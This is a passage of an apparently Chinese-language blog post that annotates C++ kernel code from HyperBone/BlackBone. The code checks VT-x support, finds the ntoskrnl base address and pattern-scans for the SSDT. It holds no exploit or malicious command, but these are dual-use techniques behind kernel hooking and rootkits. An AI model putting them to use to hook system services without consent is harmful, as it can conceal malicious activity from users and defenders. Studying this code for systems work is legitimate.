c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get CPU vendor</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Intel or AMD. If failed - Other&lt;/returns&gt;</span></span><br><span class="line"><span class="function">CPU_VENDOR <span class="title">UtilCPUVendor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPUID data = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> vendor[<span class="number">0x20</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    __cpuid( (<span class="type">int</span>*)&amp;data, <span class="number">0</span> );<span class="comment">// #include &lt;intrin.h&gt;</span></span><br><span class="line">    *(<span class="type">int</span>*)(vendor) = data.ebx;</span><br><span class="line">    *(<span class="type">int</span>*)(vendor + <span class="number">4</span>) = data.edx;</span><br><span class="line">    *(<span class="type">int</span>*)(vendor + <span class="number">8</span>) = data.ecx;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>( vendor, <span class="string">&quot;GenuineIntel&quot;</span>, <span class="number">12</span> ) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> CPU_Intel;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>( vendor, <span class="string">&quot;AuthenticAMD&quot;</span>, <span class="number">12</span> ) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> CPU_AMD;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CPU_Other;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="VmxHardSupported检查硬件虚拟化是否支持"><a href="#VmxHardSupported检查硬件虚拟化是否支持" class="headerlink" title="VmxHardSupported检查硬件虚拟化是否支持"></a>VmxHardSupported检查硬件虚拟化是否支持</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Check if VT-x is supported</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;TRUE if supported&lt;/returns&gt;</span></span><br><span class="line"><span class="function">BOOLEAN <span class="title">VmxHardSupported</span><span class="params">()</span><span class="comment">// 检查VT-x是否支持</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CPUID data = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// VMX bit</span></span><br><span class="line">    __cpuid( (<span class="type">int</span>*)&amp;data, <span class="number">1</span> );</span><br><span class="line">    <span class="keyword">if</span> ((data.ecx &amp; (<span class="number">1</span> &lt;&lt; <span class="number">5</span>)) == <span class="number">0</span>)<span class="comment">// 检查ecx寄存器的第5位是否为1</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;<span class="comment">// 如果是0，说明不支持VT-x</span></span><br><span class="line"></span><br><span class="line">    IA32_FEATURE_CONTROL_MSR Control = &#123; <span class="number">0</span> &#125;;<span class="comment">// 读取IA32_FEATURE_CONTROL_MSR寄存器</span></span><br><span class="line">    Control.All = __readmsr( MSR_IA32_FEATURE_CONTROL );<span class="comment">// IA32_FEATURE_CONTROL_MSR寄存器的地址为0x3A</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// BIOS lock check</span></span><br><span class="line">    <span class="keyword">if</span> (Control.Fields.Lock == <span class="number">0</span>)<span class="comment">// 检查是否锁定</span></span><br><span class="line">    &#123;</span><br><span class="line">        Control.Fields.Lock = TRUE;<span class="comment">// 将锁定位置1</span></span><br><span class="line">        Control.Fields.EnableVmxon = TRUE;<span class="comment">// 将VMXON使能位置1</span></span><br><span class="line">        __writemsr( MSR_IA32_FEATURE_CONTROL, Control.All );<span class="comment">// 写入IA32_FEATURE_CONTROL_MSR寄存器</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (Control.Fields.EnableVmxon == FALSE)<span class="comment">// 检查VMXON是否使能</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DPRINT</span>( <span class="string">&quot;HyperBone: CPU %d: %s: VMX locked off in BIOS\n&quot;</span>, CPU_IDX, __FUNCTION__ );<span class="comment">// 如果没有使能，打印错误信息</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UtilSSDTEntry获取系统服务描述表特定索引处函数地址"><a href="#UtilSSDTEntry获取系统服务描述表特定索引处函数地址" class="headerlink" title="UtilSSDTEntry获取系统服务描述表特定索引处函数地址"></a>UtilSSDTEntry获取系统服务描述表特定索引处函数地址</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Gets the SSDT entry address by index.</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;index&quot;&gt;Service index&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found service address, NULL if not found&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PVOID <span class="title">UtilSSDTEntry</span><span class="params">( IN ULONG index )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG size = <span class="number">0</span>;</span><br><span class="line">    PSYSTEM_SERVICE_DESCRIPTOR_TABLE pSSDT = <span class="built_in">UtilSSDTBase</span>();<span class="comment">// 获取SSDT表的基址</span></span><br><span class="line">    PVOID pBase = <span class="built_in">UtilKernelBase</span>( &amp;size );<span class="comment">// 获取内核基址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pSSDT &amp;&amp; pBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 对索引进行范围检查</span></span><br><span class="line">        <span class="keyword">if</span> (index &gt; pSSDT-&gt;NumberOfServices)<span class="comment">// 如果索引大于服务数量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (PUCHAR)pSSDT-&gt;ServiceTableBase + (((PLONG)pSSDT-&gt;ServiceTableBase)[index] &gt;&gt; <span class="number">4</span>);<span class="comment">// 返回服务地址，服务表基址+函数地址/16，因为函数地址按照16字节对齐</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="获取SSDT表函数地址"><a href="#获取SSDT表函数地址" class="headerlink" title="获取SSDT表函数地址"></a>获取SSDT表函数地址</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Gets the SSDT entry address by index.</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;index&quot;&gt;Service index&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found service address, NULL if not found&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PVOID <span class="title">UtilSSDTEntry</span><span class="params">( IN ULONG index )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ULONG size = <span class="number">0</span>;</span><br><span class="line">    PSYSTEM_SERVICE_DESCRIPTOR_TABLE pSSDT = <span class="built_in">UtilSSDTBase</span>();<span class="comment">// 获取SSDT表的基址</span></span><br><span class="line">    PVOID pBase = <span class="built_in">UtilKernelBase</span>( &amp;size );<span class="comment">// 获取内核基址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pSSDT &amp;&amp; pBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 对索引进行范围检查</span></span><br><span class="line">        <span class="keyword">if</span> (index &gt; pSSDT-&gt;NumberOfServices)<span class="comment">// 如果索引大于服务数量</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (PUCHAR)pSSDT-&gt;ServiceTableBase + (((PLONG)pSSDT-&gt;ServiceTableBase)[index] &gt;&gt; <span class="number">4</span>);<span class="comment">// 返回服务地址，服务表基址+函数地址/16，因为函数地址按照16字节对齐</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取SSDT表基地址"><a href="#获取SSDT表基地址" class="headerlink" title="获取SSDT表基地址"></a>获取SSDT表基地址</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Gets SSDT base - KiServiceTable</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;SSDT base, NULL if not found&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PSYSTEM_SERVICE_DESCRIPTOR_TABLE <span class="title">UtilSSDTBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    NTOS内核是Windows操作系统的核心部分，</span></span><br><span class="line"><span class="comment">    负责管理操作系统的基本功能，</span></span><br><span class="line"><span class="comment">    如进程管理、内存管理、设备管理、文件系统等。</span></span><br><span class="line"><span class="comment">    在NT内核中，大部分的系统服务都是通过系统调用来实现的，</span></span><br><span class="line"><span class="comment">    而系统服务描述符表(SSDT)则是记录这些系统服务函数的重要数据结构之一。</span></span><br><span class="line"><span class="comment">    如果要在Windows操作系统内核中进行一些工作</span></span><br><span class="line"><span class="comment">    ，必须首先得到NTOS内核的基地址。</span></span><br><span class="line"><span class="comment">    因为所有的系统组件和模块都是基于内核加载的，</span></span><br><span class="line"><span class="comment">    只有获得NTOS内核的基地址，才能找到内核中具体的系统函数、数据结构，以便进行修改和操作。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    PUCHAR ntosBase = <span class="built_in">UtilKernelBase</span>( <span class="literal">NULL</span> );<span class="comment">// 获取NTOS内核的基址</span></span><br><span class="line">    <span class="comment">// Already found</span></span><br><span class="line">    <span class="keyword">if</span> (g_SSDT != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> g_SSDT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!ntosBase)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    PIMAGE_NT_HEADERS pHdr = <span class="built_in">RtlImageNtHeader</span>( ntosBase );<span class="comment">// 获取NTOS内核的PE头</span></span><br><span class="line">    PIMAGE_SECTION_HEADER pFirstSec = (PIMAGE_SECTION_HEADER)(pHdr + <span class="number">1</span>);<span class="comment">// 获取NTOS内核的第一个节表</span></span><br><span class="line">    <span class="keyword">for</span> (PIMAGE_SECTION_HEADER pSec = pFirstSec; pSec &lt; pFirstSec + pHdr-&gt;FileHeader.NumberOfSections; pSec++)</span><br><span class="line">    &#123;   <span class="comment">// 遍历NTOS内核的所有节表</span></span><br><span class="line">        <span class="comment">// Non-paged, non-discardable, readable sections</span></span><br><span class="line">        <span class="comment">// Probably still not fool-proof enough...</span></span><br><span class="line">        <span class="keyword">if</span> (pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_NOT_PAGED &amp;&amp;</span><br><span class="line">            pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_EXECUTE &amp;&amp;</span><br><span class="line">            !(pSec-&gt;Characteristics &amp; IMAGE_SCN_MEM_DISCARDABLE) &amp;&amp;</span><br><span class="line">            (*(PULONG)pSec-&gt;Name != <span class="string">&#x27;TINI&#x27;</span>) &amp;&amp;</span><br><span class="line">            (*(PULONG)pSec-&gt;Name != <span class="string">&#x27;EGAP&#x27;</span>))</span><br><span class="line">        &#123;<span class="comment">// 判断是否为非分页、可执行和非可丢弃的、名称不为INIT和PAGE的代码节表</span></span><br><span class="line">            PVOID pFound = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// KiSystemServiceRepeat pattern 模式序列</span></span><br><span class="line">            UCHAR pattern[] = <span class="string">&quot;\x4c\x8d\x15\xcc\xcc\xcc\xcc\x4c\x8d\x1d\xcc\xcc\xcc\xcc\xf7&quot;</span>;</span><br><span class="line">            <span class="comment">// 模式匹配</span></span><br><span class="line">            NTSTATUS status = <span class="built_in">UtilSearchPattern</span>( pattern, <span class="number">0xCC</span>, <span class="built_in">sizeof</span>( pattern ) - <span class="number">1</span>, ntosBase + pSec-&gt;VirtualAddress, pSec-&gt;Misc.VirtualSize, &amp;pFound );</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">            &#123;   <span class="comment">// 找到SSDT表</span></span><br><span class="line">                g_SSDT = (PSYSTEM_SERVICE_DESCRIPTOR_TABLE)((PUCHAR)pFound + *(PULONG)((PUCHAR)pFound + <span class="number">3</span>) + <span class="number">7</span>);</span><br><span class="line">                <span class="comment">//DPRINT( &quot;BlackBone: %s: KeSystemServiceDescriptorTable = 0x%p\n&quot;, CPU_NUM, __FUNCTION__, g_SSDT );</span></span><br><span class="line">                <span class="keyword">return</span> g_SSDT;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="获取NTOS内核基地址"><a href="#获取NTOS内核基地址" class="headerlink" title="获取NTOS内核基地址"></a>获取NTOS内核基地址</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Get ntoskrnl base address</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pSize&quot;&gt;Size of module&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Found address, NULL if not found&lt;/returns&gt;</span></span><br><span class="line"><span class="function">PVOID <span class="title">UtilKernelBase</span><span class="params">( OUT PULONG pSize )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    ULONG bytes = <span class="number">0</span>;</span><br><span class="line">    PRTL_PROCESS_MODULES pMods = <span class="literal">NULL</span>;</span><br><span class="line">    PVOID checkPtr = <span class="literal">NULL</span>;</span><br><span class="line">    UNICODE_STRING routineName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Already found</span></span><br><span class="line">    <span class="keyword">if</span> (g_KernelBase != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pSize)</span><br><span class="line">            *pSize = g_KernelSize;</span><br><span class="line">        <span class="keyword">return</span> g_KernelBase;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>( &amp;routineName, <span class="string">L&quot;NtOpenFile&quot;</span> );<span class="comment">// 初始化查找名称</span></span><br><span class="line"></span><br><span class="line">    checkPtr = <span class="built_in">MmGetSystemRoutineAddress</span>( &amp;routineName );<span class="comment">// 获取系统函数地址</span></span><br><span class="line">    <span class="keyword">if</span> (checkPtr == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Protect from UserMode AV</span></span><br><span class="line">    <span class="comment">// 保护来自用户模式的AV（防止访问冲突）</span></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 查询系统模块信息的缓冲区大小</span></span><br><span class="line">        status = <span class="built_in">ZwQuerySystemInformation</span>( SystemModuleInformation, <span class="number">0</span>, bytes, &amp;bytes );</span><br><span class="line">        <span class="keyword">if</span> (bytes == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">DPRINT</span>( <span class="string">&quot;BlackBone: %s: Invalid SystemModuleInformation size\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 分配缓冲区</span></span><br><span class="line">        pMods = (PRTL_PROCESS_MODULES)<span class="built_in">ExAllocatePoolWithTag</span>( NonPagedPoolNx, bytes, HB_POOL_TAG );</span><br><span class="line">        <span class="comment">// 清空缓冲区</span></span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>( pMods, bytes );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取系统模块信息</span></span><br><span class="line">        status = <span class="built_in">ZwQuerySystemInformation</span>( SystemModuleInformation, pMods, bytes, &amp;bytes );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>( status ))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 模块的信息 </span></span><br><span class="line">            PRTL_PROCESS_MODULE_INFORMATION pMod = pMods-&gt;Modules;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (ULONG i = <span class="number">0</span>; i &lt; pMods-&gt;NumberOfModules; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// System routine is inside module</span></span><br><span class="line">                <span class="keyword">if</span> (checkPtr &gt;= pMod[i].ImageBase &amp;&amp;</span><br><span class="line">                    checkPtr &lt; (PVOID)((PUCHAR)pMod[i].ImageBase + pMod[i].ImageSize))</span><br><span class="line">                &#123;</span><br><span class="line">                    g_KernelBase = pMod[i].ImageBase;<span class="comment">// 找到的内核基址</span></span><br><span class="line">                    g_KernelSize = pMod[i].ImageSize;<span class="comment">// 找到的内核大小</span></span><br><span class="line">                    <span class="keyword">if</span> (pSize)</span><br><span class="line">                        *pSize = g_KernelSize;<span class="comment">// 从参数返回内核大小</span></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">DPRINT</span>( <span class="string">&quot;BlackBone: %s: Exception\n&quot;</span>, CPU_IDX, __FUNCTION__ );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pMods)</span><br><span class="line">        <span class="built_in">ExFreePoolWithTag</span>( pMods, HB_POOL_TAG );<span class="comment">// 释放缓冲区</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> g_KernelBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="对给定区域进行模式匹配"><a href="#对给定区域进行模式匹配" class="headerlink" title="对给定区域进行模式匹配"></a>对给定区域进行模式匹配</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Search for pattern</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;pattern&quot;&gt;Pattern to search for&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;wildcard&quot;&gt;Used wildcard&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;len&quot;&gt;Pattern length&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;base&quot;&gt;Base address for searching&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;size&quot;&gt;Address range to search in&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;ppFound&quot;&gt;Found location&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;Status code&lt;/returns&gt;</span></span><br><span class="line"><span class="comment">/// 遍历给定内存区域，与指定模式进行字节比较，进行模式匹配</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">UtilSearchPattern</span><span class="params">( IN PCUCHAR pattern, IN UCHAR wildcard, IN ULONG_PTR len, IN <span class="type">const</span> VOID* base, IN ULONG_PTR size, OUT PVOID* ppFound )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">NT_ASSERT</span>( ppFound != <span class="literal">NULL</span> &amp;&amp; pattern != <span class="literal">NULL</span> &amp;&amp; base != <span class="literal">NULL</span> );<span class="comment">// 断言</span></span><br><span class="line">    <span class="keyword">if</span> (ppFound == <span class="literal">NULL</span> || pattern == <span class="literal">NULL</span> || base == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> STATUS_INVALID_PARAMETER;</span><br><span class="line"></span><br><span class="line">    __try</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (ULONG_PTR i = <span class="number">0</span>; i &lt; size - len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            BOOLEAN found = TRUE;</span><br><span class="line">            <span class="keyword">for</span> (ULONG_PTR j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (pattern[j] != wildcard &amp;&amp; pattern[j] != ((PCUCHAR)base)[i + j])</span><br><span class="line">                &#123;</span><br><span class="line">                    found = FALSE;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (found != FALSE)</span><br><span class="line">            &#123;</span><br><span class="line">                *ppFound = (PUCHAR)base + i;</span><br><span class="line">                <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNHANDLED_EXCEPTION;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="初始化全局变量"><a href="#初始化全局变量" class="headerlink" title="初始化全局变量"></a>初始化全局变量</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 